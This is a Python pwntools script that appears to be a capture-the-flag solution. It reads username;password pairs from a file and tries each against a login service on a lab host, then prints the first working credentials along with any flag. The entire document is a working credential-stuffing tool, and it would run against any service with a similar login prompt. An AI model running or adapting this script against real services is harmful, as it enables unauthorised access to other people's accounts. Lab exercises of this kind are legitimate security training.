#!/usr/bin/env python3
from pwn import *
import sys

# ---------------- CONFIG ----------------
HOST, PORT = "chatelaine.cylabacademy.net", 25641
CREDS_FILE = "creds.txt"          # your user;pass file
SEP        = ";"
USER_PROMPT = b"username"
PASS_PROMPT = b"password"
FAIL_HINT   = b"incorrect"        # present ONLY on failure
SUCCESS_MARK = b"flag{"
# -----------------------------------------

context.log_level = "error"

def attempt(user, pw):
    try:
        r = remote(HOST, PORT, timeout=4)
        r.recvuntil(USER_PROMPT, timeout=4)
        r.sendline(user.encode())
        r.recvuntil(PASS_PROMPT, timeout=4)
        r.sendline(pw.encode())
        out = r.recvall(timeout=4)
        r.close()
        return out
    except Exception:
        return b""

def is_hit(out):
    if not out:
        return False
    if SUCCESS_MARK in out:
        return True
    return FAIL_HINT not in out.lower()

n = 0
with open(CREDS_FILE, "r", errors="ignore") as f:
    for line in f:
        line = line.strip()
        if not line or SEP not in line:
            continue
        user, pw = line.split(SEP, 1)      # split on FIRST ; only
        user, pw = user.strip(), pw.strip()
        if not user or not pw:
            continue
        n += 1
        out = attempt(user, pw)
        if is_hit(out):
            print("\n=== HIT ===")
            print(f"user={user}  pass={pw}")
            print(out.decode(errors="replace"))
            sys.exit(0)
print(f"tried {n} pairs, no hit")
